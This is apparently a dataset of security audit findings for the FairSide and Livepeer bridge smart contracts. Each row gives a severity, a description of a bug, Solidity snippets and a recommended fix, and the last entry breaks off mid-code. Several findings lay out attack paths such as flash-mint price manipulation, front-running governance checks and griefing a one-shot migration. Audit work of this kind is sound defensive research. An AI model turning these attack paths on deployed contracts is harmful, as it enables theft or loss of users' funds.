11.md,Incorrect type conversion in the contract `ABC` makes users unable to burn FSD tokens,high,"The function `_calculateDeltaOfFSD` of contract `ABC` incorrectly converts an `int256` type parameter, `_reserveDelta`, to `uint256` by explicit conversion, which in general results in an extremely large number when the provided parameter is negative. The extremely large number could cause a SafeMath operation `sub` at line 43 to revert, and thus the FSD tokens cannot be burned as `_reserveDelta` is negative when burning FSD tokens.

Simply calling `fsd.burn` after a successful `fsd.mint` will trigger this bug.

Recommend using the solidity function `abs` to get the `_reserveDelta` absolute value.


> Fixed in [PR#1](https://github.com/fairside-core/2021-05-fairside/pull/1)."
11.md,`ERC20ConvictionScore._updateConvictionScore` uses stale credit score for `governanceDelta`,high,"In `ERC20ConvictionScore._updateConvictionScore`, when the user does not fulfill the governance criteria anymore, the `governanceDelta` is the old conviction score of the previous block.

```solidity
isGovernance[user] = false;
governanceDelta = getPriorConvictionScore(
    user,
    block.number - 1
);
```

The user could increase their conviction/governance score first (in the same block) and then lose their status in a second transaction. After which, the total governance conviction score would only be reduced by the previous score.

** Example:**
Block n - 10000: User is a governor and has a credit score of 1000, which was also contributed to the `TOTAL_GOVERNANCE_SCORE`
Block n:
- User updates their own conviction score using the public `updateConvictionScore` function, which increases the credit score by 5000 based on the accumulated time. The total governance credit score increased by 5000, making the user contribute 6000 credit score to governance in total.
- User transfers their whole balance away, the balance drops below `governanceMinimumBalance`, and the user is not a governor anymore. The `governanceDelta` update of the transfer should be 6000 (user's whole credit score), but it's only `1000` because it takes the snapshot of block n - 1.

In this way, the `TOTAL_GOVERNANCE_SCORE` score can be inflated and, in the worst case, break the voting mechanism, as no proposals can reach the quorum (percentage of `totalVotes`) anymore.

Recommend using the current conviction store which should be `governanceDelta = checkpoints[user][userCheckpointsLength - 1].convictionScore`."
11.md,Incorrect implementation of arctan in the contract `FairSideFormula`,high,"The current implementation of the arctan formula in the contract `FairSideFormula` is inconsistent with the referenced paper and could cause incorrect results when the input parameter is negative. The erroneous formula affects the function `calculateDeltaOfFSD` and the number of FSD tokens minted or burned.

The function `_arctan` misses two `abs` on the variable `a'. The correct implementation should be:

```solidity
function _arctan(bytes16 a) private pure returns (bytes16) {
    return
        a.mul(PI_4).sub(
            a.mul(a.abs().sub(ONE)).mul(APPROX_A.add(APPROX_B.mul(a.abs())))
        );
}
```

Notice that `_arctan` is called by `arctan`, and `arctan` is called by `arcs` with `ONE.sub(arcInner)` provided as the input parameter. Since `arcInner = MULTIPLIER_INNER_ARCTAN.mul(x).div(fS3_4)` can be a large number (recall that `x` is the capital pool), it is possible that the parameter `a` is negative.

Recommend modifying the `_arctan` function as above."
11.md,Incorrect use of `_addTribute` instead of `_addGovernanceTribute`,medium,"As part of the `purchaseMembership()` function, the `addRegistrationTributeGovernance()` function is called by the FSD network to update tribute when 7.5% is contributed towards governance. However, this function incorrectly calls `_addTribute()` (as is also done in `addRegistrationTribute`) instead of `_addGovernanceTribute()`.

The impact of this is that `governanceTributes` never gets updated, rendering all of the tribute accounting logic incorrect.

Recommend using `_addGovernanceTribute()` instead of `_addTribute` on L140 of FSD.sol"
11.md,Call to `swapExactTokensForETH` in `liquidateDai()` will always fail,medium,"`liquidateDai()` calls Uniswap’s `swapExactTokensForETH` to swap Dai to ETH. This will work if `msg.sender` (i.e., the FSD contract) has already given the router an allowance amount that is at least as much as the input token Dai.

Given that there is no prior approval, the call to UniswapV2 router for swapping will fail. This is because `msg.sender` has not approved UniswapV2 with an allowance for the tokens that are attempting to be swapped.

The impact is that, while working with the Dai stablecoin, `updateCostShareRequest()` will fail and revert.

Recommend adding FSD approval to UniswapV2 with an allowance for the tokens that are attempting to be swapped."
11.md,Conviction totals not updated during tokenization,medium,"`_updateConvictionScore()` function returns `convictionDelta` and `governanceDelta` which need to be used immediately in a call to `_updateConvictionTotals (convictionDelta, governanceDelta)` for updating the conviction totals of conviction and governance-enabled conviction for the entire FairSide network.

This updating of totals after a call to `_updateConvictionScore()` is done on Line70 in `_beforeTokenTransfer()` and on Line367 in `updateConvictionScore()` of ERC20ConvictionScore.sol.

However, the return values of `_updateConvictionScore()` are ignored on Line284 in `tokenizeConviction()` and are not used to update the totals using `_updateConvictionTotals(convictionDelta, governanceDelta)`.

The impact of this is that when a user tokenizes their conviction score, their conviction deltas are updated and recorded (only if the funds locked are zero, which is incorrect and reported separately in a different finding), but the totals are not updated. This leads to incorrect accounting of `TOTAL_CONVICTION_SCORE` and `TOTAL_GOVERNANCE_SCORE`, which are used to calculate tributes, and therefore will lead to incorrect tribute calculations.

**EXAMPLE:**
> Alice calls `tokenizeConviction()` to convert her conviction score into an NFT. Her conviction deltas (as returned by `_updateConvictionScore()`) are ignored. Furthermore, `TOTAL_CONVICTION_SCORE` and `TOTAL_GOVERNANCE_SCORE` values are not updated. As a result, the tributes rewarded are proportionally more than what they should have been. This is because the conviction score totals are used as the denominator in `availableTribute()` and `availableGovernanceTribute()`.

Recommend using the return values of the `_updateConvictionScore()` function (i.e. `convictionDelta` and `governanceDelta`) on Line284 of `ERC20ConvictionScore.sol`, and then use them in a call to `_updateConvictionTotals(convictionDelta, governanceDelta)`."
11.md,Eth may get stuck in contract,medium,"The Istanbul hardfork increases the gas cost of the SLOAD operation and therefore breaks some existing smart contracts.

In file `withdrawable.sol`, contract uses `transfer()` to send eth from contract to EOA due which eth can get stuck.

The reason behind this is that, after the Istanbul hardfork, any smart contract that uses `transfer()` or `send()` is taking a hard dependency on gas costs by forwarding a fixed amount of gas (2300). This forwards 2300 gas, which may not be enough if the recipient is a contract and the cost of gas changes.

Recommend using `call()` to send eth.


> Fixed in PR#8."
11.md,Bug inside ABDKMathQuad library,medium,"The `FairSideFormula` library is using the `ABDKMathQuad` library underneath. According to the `ABDKMathQuad` README, the range of values is the following:

> The minimum strictly positive (subnormal) value is 2^−16494 ≈ 10^−4965 and has a precision of only one bit. The minimum positive normal value is 2^−16382 ≈ 3.3621 × 10^−4932 and has a precision of 113 bits, i.e., ±2^−16494 as well. The maximum representable value is 2^16384 − 2^16271 ≈ 1.1897 × 10^4932.

Using Echidna, a fuzzing tool for smart contracts, I found some edge cases in which some of the operations do not work as expected. This is the test code I ran using `echidna-test contracts/TestABDKMathQuad --contract TestABDKMathQuad`. see [issue](https://github.com/code-423n4/2021-05-fairside-findings/issues/32) for more details.

If we check in Remix, we can see that there is a small difference when converting from UInt to Bytes16 (and vice versa). This issue is probably the same with all the other operations.

Recommend using some fuzzing tool like [Echidna](https://github.com/crytic/echidna) to verify that there are no edge cases."
11.md,pendingWithdrawals just increments,medium,"Sponsor commented that this related to another bug and referenced ""[H-05] `Withdrawable.withdraw` does not decrease `pendingWithdrawals`""
see issue [#48](https://github.com/code-423n4/2021-05-fairside-findings/issues/48) for more details."
11.md,NFTs can never be redeemed back to their conviction scores leading to lock/loss of funds,medium,"Besides the conviction scores of users, there appears to be tracking of the FairSide protocol's tokenized conviction score as a whole (using `fscAddress = address(fairSideConviction)`). This is evident in the attempted reduction of the protocol's score when a user acquires conviction back from an NFT. However, the complementary accrual of the user's conviction score to `fscAddress` when the user tokenizes their conviction score to mint an NFT is missing in `tokenizeConviction()`.

Because of this missing update of the conviction score to `fscAddress` upon tokenization, there are no checkpoints written for `fscAddress`. There also doesn't appear to be any initialization for bootstrapping this address's conviction score checkpoints. As a result, the `sub224()` on Line350 of `ERC20ConvictionScore.sol` will always fail with an underflow. This is because `fscOld = 0` (because `fscNum = 0`) and `convictionScore > 0`, effectively reverting all calls to `acquireConviction()`.

The impact of this is that all tokenized NFTs can never be redeemed back to their conviction scores leading to a lock/loss of FSD funds for users who tokenized/sold/bought FairSide NFTs.

**Proof of Concept:**
1. Alice tokenizes her conviction score into an NFT. She sells that NFT to Bob, who pays an amount commensurate with the conviction score captured by that NFT (as valued by the market) and any FSDs locked with the NFT.

2. Bob then attempts to redeem the bought NFT back to the conviction score to use it on the FairSide network. But the call to `acquireConviction()` fails. Bob is never able to redeem Alice's NFT and has lost the funds used to buy it.

Recommend adding appropriate logic to bootstrap, initialize `fscAddress` 's tokenized conviction score checkpoints, and update it during tokenization."
11.md,`ERC20ConvictionScore` allows transfers to special `TOTAL_GOVERNANCE_SCORE` address,medium,"The credit score of the special `address(type(uint160).max)` is supposed to represent the sum of the credit scores of all users that are governors.

But, any user can directly transfer to this address, increasing its balance and accumulating a credit score in `_updateConvictionScore(to=address(uint160.max), amount)`.

It'll first write a snapshot of this address' balance, which should be very low:

```solidity
// in _updateConvictionScore
_writeCheckpoint(user, userNum, userNew) = _writeCheckpoint(TOTAL_GOVERNANCE_SCORE, userNum, checkpoints[user][userNum - 1].convictionScore + convictionDelta);
```

This address then accumulates a score based on its balance, which can be updated using `updateConvictionScore(uint160.max)` and breaks the invariant.

Increasing it might be useful for non-governors that don't pass the voting threshold and want to grief the proposal voting system by increasing the `quorumVotes` threshold required for proposals to pass. By manipulating `FairSideDAO.totalVotes`, `totalVotes` can be arbitrarily inflated and break the voting mechanism as no proposals can reach the quorum (percentage of `totalVotes`) anymore.

Recommend disallowing transfers from/to this address. Or better, track the total governance credit score in a separate variable, not in an address."
11.md,Should check return data from Chainlink aggregators,medium,"The `getEtherPrice` function in the contract `FSDNetwork` fetches the ETH price from a Chainlink aggregator using the `latestRoundData` function. However, there are no checks on `roundID` nor `timeStamp`, resulting in stale prices.

Recommend adding checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:
```Solidity
(uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = ETH_CHAINLINK.latestRoundData();
require(answeredInRound >= roundID, ""..."");
require(timeStamp != 0, ""..."");
```"
11.md,`gracePeriod` not increased after membership extension,medium,"In the function `purchaseMembership` of FSDNetwork.sol, when the membership is extended, `membership[msg.sender].creation` is increased. However, `membership[msg.sender].gracePeriod` is not increased.
This might lead to a `gracePeriod` that is lower than expected. It seems logical to also increase the `gracePeriod`.

FSDNetwork.sol:
```solidity
function purchaseMembership(uint256 costShareBenefit) external {
     ...
      if (membership[msg.sender].creation == 0) {
            ...
            membership[msg.sender].creation       = block.timestamp;
            membership[msg.sender].gracePeriod =  membership[msg.sender].creation +  MEMBERSHIP_DURATION +  60 days;
        } else {
          ....
          membership[msg.sender].creation += durationIncrease;
   }
```
Recommend checking to see if `gracePeriod` has to be increased and then adding the necessary logic when that is the case."
11.md,The variable `fShareRatio` is vulnerable to manipulation by flash minting and burning,medium,"The variable `fShareRatio` in the function `purchaseMembership` of contract `FSDNetwork` is vulnerable to manipulation by flash minting and burning, which could affect several critical logics, such as the check of enough capital in the pool (line 139-142) and the staking rewards (line 179-182).

The `fShareRatio` is calculated (line 136) by:

```solidity
(fsd.getReserveBalance() - totalOpenRequests).mul(1 ether) / fShare;
```

Where `fsd.getReserveBalance()` can be significantly increased by a user minting a large amount of FSD tokens with flash loans. In that case, the increased `fShareRatio` could affect the function `purchaseMembership` results. For Example, the user could purchase the membership even if the `fShareRatio` is < 100% previously, or the user could earn more staking rewards than before to reduce the membership fees. Although performing flash minting and burning might not be profitable overall since a 3.5% tribute fee is required when burning FSD tokens, it is still important to be aware of the possible manipulation of `fShareRatio`.

Recommend forcing users to wait for (at least) a block to prevent flash minting and burning."
11.md,`ERC20ConvictionScore.acquireConviction` implements wrong governance checks,medium,"There are two issues with the governance checks when acquiring them from an NFT:

#### **(Issue 1) Missing balance check**
The governance checks in `_updateConvictionScore` are:
```solidity
!isGovernance[user]
&& userConvictionScore >= governanceThreshold
&& balanceOf(user) >= governanceMinimumBalance;
```
Whereas in `acquireConviction`, only `userConvictionScore >= governanceThreshold` is checked but not `&& balanceOf(user) >= governanceMinimumBalance`.

```solidity
else if (
    !isGovernance[msg.sender] && userNew >= governanceThreshold
) {
    isGovernance[msg.sender] = true;
}
```

#### **(Issue 2) the `wasGovernance` might be outdated**

The second issue is that at the time of NFT creation, the `governanceThreshold` or `governanceMinimumBalance` was different and would not qualify for a governor now.
The NFT's governance state is blindly appplied to the new user:

```solidity
if (wasGovernance && !isGovernance[msg.sender]) {
    isGovernance[msg.sender] = true;
}
```

This allows a user to circumvent any governance parameter changes by front-running the change with an NFT creation. It's easy to circumvent the balance check to become a governor by minting and redeeming your own NFT. One can also circumvent any governance parameter increases by front-running these actions with an NFT creation and then backrunning with a redemption.

Recommend adding the missing balance check-in `acquireConviction`, removing the `wasGovernance` governance transfer from the NFT, and recomputing it based solely on the current `governanceThreshold` / `governanceMinimumBalance` settings."
11.md,Lack of zero-address checks for immutable addresses will force contract redeployment if zero-address used accidentally,low,"Zero-address checks as input validation on address parameters are always a best practice. This is especially true for critical addresses that are immutable and set in the constructor because they cannot be changed later. Accidentally using zero addresses here will lead to failing logic or force contract redeployment and increased gas costs.

Recommend adding zero-address input validation for these addresses in the constructor."
11.md,Dangerous Solidity compiler pragma range that spans breaking versions,low,"All contracts use a Solidity compiler pragma range >=0.6.0 <0.8.0, which spans a breaking change version 0.7.0. This compiler range is very broad and includes many syntactic/semantic changes across the versions. Specifically, see silent changes in https://docs.soliditylang.org/en/v0.7.0/070-breaking-changes.html#silent-changes-of-the-semantics.

For Example, this compiler range allows testing with Solidity compiler version 0.6.x but deployment with 0.7.x. While any breaking syntactic changes will be caught at compile time, there is a risk that the silent change in 0.7.0, which applies to exponentiation/shift operand types, might affect the FairSide formula or other mathematical calculations, thus breaking assumptions and accounting.

The opposite scenario may also happen where testing is performed with Solidity compiler version 0.7.x but deployed with 0.6.x, which may allow bugs fixed in 0.7.x to be present in the deployed code.

Recommend using the same compiler version both for testing and deployment by enforcing this in the pragma itself. An unlocked/floating pragma is risky, especially one that ranges across a breaking compiler minor version.



 ##  [[L-03] Usage of transfer](https://github.com/code-423n4/2021-05-fairside-findings/issues/47)

In `Withdrawable.withdraw`: The `address.transfer` function is used to send ETH to an account. It is restricted to a low amount of gas and might fail if gas costs change in the future or if a smart contract's fallback function handler implements anything non-trivial.

Recommend considering using the lower-level `.call{value: value}` instead and checking its success return value.


> Although I am fine with the severity, perhaps it may not be applicable given that even after EIP-3074 transfers will not fail with proper access lists, and I highly doubt the transfer method will fail to work altogether anytime soon.
> Fixed in PR#8."
11.md,Missing use of DSMath functions may lead to underflows/overflows,low,"The FairSide contracts use DappHub's DSMath safe arithmetic library that provides overflow/underflow protection. But, the safe DSMath functions are not used in many places, especially in the FSD `mint`/`burn` functions.

While there do not appear to be any obvious integer overflows/underflows in the conditions envisioned, there could be exceptional paths where overflows/underflows may be triggered, leading to minting/burning an unexpected number of tokens.

Recommend using DSMath `add`/`sub` functions instead of +/- in all places."
11.md,`convictionless` mapping is not used,low,"`convictionless` can be set via function `setConvictionless`; however, it is not used anywhere across the system, thus making it useless. Based on the comment above this variable, I expect to see it used in functions like `_updateConvictionScore`.

Recommend either remove this mapping or use it where intended."
11.md,Flash minting and burning can reduce the paid fees when purchasing a membership or opening a cost-share request,low,"Users can pay fewer FSD tokens when purchasing a membership or opening a cost-share request by flash minting and burning FSD tokens, which could significantly affect the FSD spot price.

The function `getFSDPrice` returns the current FSD price based on the reserves in the capital pool (see lines 353-364 in contract `FSDNetwork`). Notice that when minting and burning FSD tokens, the `fsd.getReserveBalance()` increases but not the `fShare`. Therefore, according to the pricing formula, `FairSideFormula.f`, the FSD price increases when minting, and vice versa, decreases when burning.

When purchasing a membership, the number of FSD tokens that a user should pay is calculated based on the current FSD price, which is vulnerable to manipulation by flash minting and burning. Consider a user performing the following actions (all are done within a single transaction or flashbot bundle):

1. The user mints a large number of FSD (by using flash loans) to raise the current FSD price.
2. The user purchases a membership by calling `purchaseMembership`. Since the price of FSD is relatively high, the user pays fewer FSD tokens for the membership fee than before.
3. The user burns the previously minted FSD tokens, losing 3.5% of his capital for the tribute fees.

Although the user pays for the 3.5% tribute fees, it is still possible to make a profit. Suppose that the price of FSD to ETH is `p_1` and `p_2` before and after minting, respectively. The user purchases a membership with `x` ETH `costShareBenefit` and uses `y` ETH to flash mint the FSD tokens. In a regular purchase, the user pays `0.04x / p_1` FSD tokens, equivalent to `0.04x` ETH. By performing flash mints and burns, the user pays `0.04x / p_2` FSD tokens, which is, in fact, equivalent to `0.04x * p_1 / p_2` ETH. He also pays `0.035y` ETH for tribute fees. The profit user made is `0.04x * (1 - p1 / p2) - 0.035y` (ETH), where `p2` and `y` are dependent to each other but independent to `x`. Thus, the profit can be positive if `costShareBenefit` is large enough.

The same vulnerability exists when a user opens a cost-share request, where the `bounty` to pay is calculated based on the current price of FSD tokens.

Recommend forcing users to wait for (at least) a block to prevent flash minting and burning."
11.md,Check if variables are initialized,low,"A variable named `fairSideConviction` is set in the contract FSD function `setFairSideConviction`. However, functions that use this variable do not check that it is already initialized. For example, function `tokenizeConviction` in contract `ERC20ConvictionScore` may transfer tokens to the 0x0 address:
```solidity
   _transfer(msg.sender, address(fairSideConviction), locked);
```
This will make these tokens inaccessible and basically burned. It would be better if the code explicitly checked before that ```address(fairSideConviction) != address(0)```

Rating this as low because I expect that, in practice, these variables will be initialized as soon as possible.

Also, this may be an additional small issue. Still, I think it would make sense if functions `setFairSideConviction` and `setFairSideNetwork` explicitly check that the parameter is not 0x0 address as it is theoretically possible to invoke these functions again and again when the address is empty.

Recommend requiring ```address(fairSideConviction) != address(0)``` where this variable is used. Same can be applied to fsdNetwork variable."
73.md,[WP-H5] `L1Migrator.sol#migrateETH()` does not send `bridgeMinter`'s ETH to L2 causing ETH get frozen in the contract,high,".

Per the `arb-bridge-eth` code:

> all msg.value will deposited to callValueRefundAddress on L2

- <https://github.com/OffchainLabs/arbitrum/blob/78118ba205854374ed280a27415cb62c37847f72/packages/arb-bridge-eth/contracts/bridge/Inbox.sol#L313>

- <https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1ArbitrumMessenger.sol#L65-L74>

```solidity
uint256 seqNum = inbox.createRetryableTicket{value: _l1CallValue}(
    target,
    _l2CallValue,
    maxSubmissionCost,
    from,
    from,
    maxGas,
    gasPriceBid,
    data
);
```

At L308-L309, ETH held by `BridgeMinter` is withdrawn to L1Migrator:

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L309>

```solidity
uint256 amount = IBridgeMinter(bridgeMinterAddr)
    .withdrawETHToL1Migrator();
```

However, when calling `sendTxToL2()` the parameter `_l1CallValue` is only the `msg.value`, therefore, the ETH transferred to L2 does not include any funds from `bridgeMinter`.

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L318-L327>

```solidity
sendTxToL2(
    l2MigratorAddr,
    address(this), // L2 alias of this contract will receive refunds
    msg.value,
    amount,
    _maxSubmissionCost,
    _maxGas,
    _gasPriceBid,
    """"
)
```

As a result, due to lack of funds, `call` with value = amount to `l2MigratorAddr` will always fail on L2.

Since there is no other way to send ETH to L2, all the ETH from `bridgeMinter` is now frozen in the contract.

#### Recommendation

Change to:

```solidity
sendTxToL2(
    l2MigratorAddr,
    address(this), // L2 alias of this contract will receive refunds
    msg.value + amount, // the `amount` withdrawn from BridgeMinter should be added
    amount,
    _maxSubmissionCost,
    _maxGas,
    _gasPriceBid,
    """"
)
```"
73.md,L1Migrator.migrateLPT` can be used to take away protocol's access to LPT tokens in BridgeMinter,medium,".

Same thing as the ETH issue I reported earlier. I wasn't sure if those are supposed to be a single issue or not. The concept is the same. But, now you lose LPT tokens.

The `L1Migrator.migrateLPT()` function can be called by **anyone**. It pulls all the LPT from the `BridgeMinter` contract and starts the process of moving the funds to L2. First of all, this function is only executable once. The RetryableTicket created with the first call is the only chance of moving the funds to L2.

The attacker can call the function with [parameters](https://developer.offchainlabs.com/docs/l1\_l2\_messages#parameters) that make the creation of the RetryableTicket on L2 fail. Thus, the LPT sits in the L1Migrator contract with no way of moving it to L2 or anywhere else. Effectively, the funds are lost.

#### Proof of Concept

The function is only executable once because it uses the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` to specify the amount of LPT to be sent to L2: <https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L342>

After the first call to `migrateLPT()` that function will always return 0 since the `BridgeMinter` won't have any more LPT: <https://github.com/livepeer/protocol/blob/streamflow/contracts/token/BridgeMinter.sol#L107>

So after the attacker called `migrateLPT()` with insufficient funds to create a RetryableTicket on L2 we have the following state:

*   BridgeMinter has 0 LPT
*   L1Migrator has X amount of LPT that is not accessible. There are no functions to get the LPT out of there.
*   1 failed RetryTicket

The same thing can also be triggered by a non-malicious caller by simply providing insufficient funds. The whole design of only being able to try once is the issue here.

#### Recommended Mitigation Steps

Instead of using the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` you should use the balance of the `L1Migrator` contract.

It might also make sense to **not** allow anybody to call the function. I don't see the benefit of that.

Actually, the funds aren't lost. The funds are sent to the Escrow contract which can be used to transfer the funds back to the BridgeMinter contract. Thus, you could reset the whole thing to its initial state and call `L1Migrator.migrateLPT()` again. But, a really persistent attacker has the ability to DoS the function by frontrunning any call to it which results in the RetryableTicket failing again. Thus, you'd have to transfer the funds from the Escrow contract to the BrigeMinter again and so on.

So the same scenario I've outlined earlier is still viable. It's just a bit more difficult now since it has a higher cost for the attacker now. Because of that I think it's an medium issue instead of high.

Also, the mitigation steps I've given aren't valid. You can't use the `L1Migrator` contract's balance since it will always be 0 (the funds are sent to the Escrow contract). Thus the best solution would be to just limit the access to the function."
73.md,"[WP-H3] `L1Migrator.sol#migrateETH()` Improper implementation of `L1Migrator` causing `migrateETH()` always reverts, can lead to ETH in `BridgeMinter` getting stuck in the contract",medium,".

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L310>

```solidity
uint256 amount = IBridgeMinter(bridgeMinterAddr).withdrawETHToL1Migrator();
```

`L1Migrator.sol#migrateETH()` will call `IBridgeMinter(bridgeMinterAddr).withdrawETHToL1Migrator()` to withdraw ETH from `BridgeMinter`.

However, the current implementation of `L1Migrator` is unable to receive ETH.

<https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/BridgeMinter.sol#L94-L94>

```solidity
(bool ok, ) = l1MigratorAddr.call.value(address(this).balance)("""");
```

A contract receiving Ether must have at least one of the functions below:

*   `receive() external payable`
*   `fallback() external payable`

`receive()` is called if `msg.data` is empty, otherwise `fallback()` is called.

Because `L1Migrator` implement neither `receive()` or `fallback()`, the `call` at L94 will always revert.

#### Impact

All the ETH held by the `BridgeMinter` can get stuck in the contract.

#### Recommendation

Add `receive() external payable {}` in `L1Migrator`."
73.md,Fund loss when insufficient call value to cover fee,medium,".

Fund can be lost if the L1 call value provided is insufficient to cover `_maxSubmissionCost`, or stuck if insufficient to cover `_maxSubmissionCost + (_maxGas * _gasPriceBid)`.

#### Proof of Concept

`outboundTransfer` in `L1LPTGateway` does not check if the call value is sufficient, if it is `< _maxSubmissionCost` the retryable ticket creation will fail and fund is lost; if it is `<_maxSubmissionCost + (_maxGas * _gasPriceBid)` the ticket would require manual execution.

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1LPTGateway.sol#L80>
```solidity
function outboundTransfer(
    address _l1Token,
    address _to,
    uint256 _amount,
    uint256 _maxGas,
    uint256 _gasPriceBid,
    bytes calldata _data
) external payable override whenNotPaused returns (bytes memory) {
    require(_l1Token == l1Lpt, ""TOKEN_NOT_LPT"");

    // nested scope to avoid stack too deep errors
    address from;
    uint256 seqNum;
    bytes memory extraData;
    {
        uint256 maxSubmissionCost;
        (from, maxSubmissionCost, extraData) = parseOutboundData(_data);
        require(extraData.length == 0, ""CALL_HOOK_DATA_NOT_ALLOWED"");

        // transfer tokens to escrow
        TokenLike(_l1Token).transferFrom(from, l1LPTEscrow, _amount);

        bytes memory outboundCalldata = getOutboundCalldata(
            _l1Token,
            from,
            _to,
            _amount,
            extraData
        );

        seqNum = sendTxToL2(
            l2Counterpart,
            from,
            maxSubmissionCost,
            _maxGas,
            _gasPriceBid,
            outboundCalldata
        );
    }

    emit DepositInitiated(_l1Token, from, _to, seqNum, _amount);

    return abi.encode(seqNum);
}
```
#### Recommended Mitigation Steps

Add check similar to the one used in `L1GatewayRouter` provided by Arbitrum team

<https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/ethereum/gateway/L1GatewayRouter.sol#L236>
```solidity
uint256 expectedEth = _maxSubmissionCost + (_maxGas * _gasPriceBid);
require(_maxSubmissionCost > 0, ""NO_SUBMISSION_COST"");
require(msg.value == expectedEth, ""WRONG_ETH_VALUE"");
```"
73.md,[WP-M0] `MINTER_ROLE` can be granted by the deployer of L2LivepeerToken and mint arbitrary amount of tokens,medium,".

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L23-L30>

```solidity
function mint(address _to, uint256 _amount)
    external
    override
    onlyRole(MINTER_ROLE)
{
    _mint(_to, _amount);
    emit Mint(_to, _amount);
}
```

Using the `mint()` function of `L2LivepeerToken`, an address with `MINTER_ROLE` can burn an arbitrary amount of tokens.

If the private key of the deployer or an address with the `MINTER_ROLE` is compromised, the attacker will be able to mint an unlimited amount of LPT tokens.

We believe this is unnecessary and poses a serious centralization risk.

#### Recommendation

Consider removing the `MINTER_ROLE`, make the `L2LivepeerToken` only mintable by the owner, and make the L2Minter contract to be the owner and therefore the only minter."
73.md,[WP-M1] `BURNER_ROLE` can burn any amount of L2LivepeerToken from an arbitrary address,medium,".

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L36-L43>

```solidity
function burn(address _from, uint256 _amount)
    external
    override
    onlyRole(BURNER_ROLE)
{
    _burn(_from, _amount);
    emit Burn(_from, _amount);
}
```

Using the `burn()` function of `L2LivepeerToken`, an address with `BURNER_ROLE` can burn an arbitrary amount of tokens from any address.

We believe this is unnecessary and poses a serious centralization risk.

A malicious or compromised `BURNER_ROLE` address can take advantage of this, burn the balance of a Uniswap pool and effectively steal almost all the funds from the liquidity pool (eg, Uniswap LPT-WETH Pool).

#### Recommendation

Consider removing the `BURNER_ROLE` and change `burn()` function to:

```solidity
function burn(uint256 _amount)
    external
    override
{
    _burn(msg.sender, _amount);
    emit Burn(msg.sender, _amount);
}
```

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/49cf5401b0514511675d781a1e29d6b0325cfe88/contracts/L2/gateway/L2LPTGateway.sol#L34-L45>

`Mintable(l2Lpt).burn(from, _amount);` in `L2LPTGateway.sol#outboundTransfer()` should also be replaced with:

```solidity
Mintable(l2Lpt).transferFrom(from, _amount);
Mintable(l2Lpt).burn(_amount);
```"
73.md,[WP-M2] `DEFAULT_ADMIN_ROLE` can approve arbitrary address to spend any amount from the `L1Escrow` contract,medium,".

<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/escrow/L1Escrow.sol#L21-L28>

```solidity
function approve(
    address _token,
    address _spender,
    uint256 _value
) public onlyRole(DEFAULT_ADMIN_ROLE) {
    ApproveLike(_token).approve(_spender, _value);
    emit Approve(_token, _spender, _value);
}
```

`L1Escrow.sol#approve()` allows an address with `DEFAULT_ADMIN_ROLE` can approve an arbitrary amount of tokens to any address.

We believe this is unnecessary and poses a serious centralization risk.

A malicious or compromised `DEFAULT_ADMIN_ROLE` address can take advantage of this, and steal all the funds from the `L1Escrow` contract.

#### Recommendation

Consider removing `approve()` function and approve `l1LPT` to `l1Gateway` in the constructor."
73.md,"[WP-M4] Unable to use `L2GatewayRouter` to withdraw LPT from L2 to L1, as `L2LPTGateway` does not implement `L2GatewayRouter` expected method",medium,".

Per the document: <https://github.com/code-423n4/2022-01-livepeer#l2---l1-lpt-withdrawal>

> The following occurs when LPT is withdrawn from L2 to L1:

> The user initiates a withdrawal for X LPT. This can be done in two ways: a. Call outboundTransfer() on L2GatewayRouter which will call outboundTransfer() on L2LPTGateway b. Call outboundTransfer() directly on L2LPTGateway

The method (a) described above won't work in the current implementation due to the missing interface on `L2LPTGateway`.

When initiate a withdraw from the Arbitrum Gateway Router, `L2GatewayRouter` will call `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` on `ITokenGateway(gateway)`:

```solidity
function outboundTransfer(
    address _token,
    address _to,
    uint256 _amount,
    uint256 _maxGas,
    uint256 _gasPriceBid,
    bytes calldata _data
) external payable returns (bytes memory);
```

<https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/arbitrum/gateway/L2GatewayRouter.sol#L57-L64>

```solidity
function outboundTransfer(
    address _l1Token,
    address _to,
    uint256 _amount,
    bytes calldata _data
) public payable returns (bytes memory) {
    return outboundTransfer(_l1Token, _to, _amount, 0, 0, _data);
}
```

<https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/libraries/gateway/GatewayRouter.sol#L78-L102>

```solidity
function outboundTransfer(
    address _token,
    address _to,
    uint256 _amount,
    uint256 _maxGas,
    uint256 _gasPriceBid,
    bytes calldata _data
) public payable virtual override returns (bytes memory) {
    address gateway = getGateway(_token);
